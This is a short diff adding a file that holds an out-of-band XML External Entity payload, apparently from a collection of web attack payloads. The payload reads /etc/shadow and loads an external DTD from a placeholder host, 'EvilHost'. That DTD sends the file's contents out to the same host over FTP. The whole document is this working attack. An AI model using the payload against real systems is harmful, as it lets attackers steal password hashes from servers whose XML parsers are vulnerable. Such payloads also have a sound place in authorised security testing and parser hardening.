@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [
+        <!ENTITY % data3 SYSTEM "file:///etc/shadow">
+        <!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
+        %sp;
+        %param3;
+        %exfil;
+        ]>
+
+        ## External dtd: ##
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">
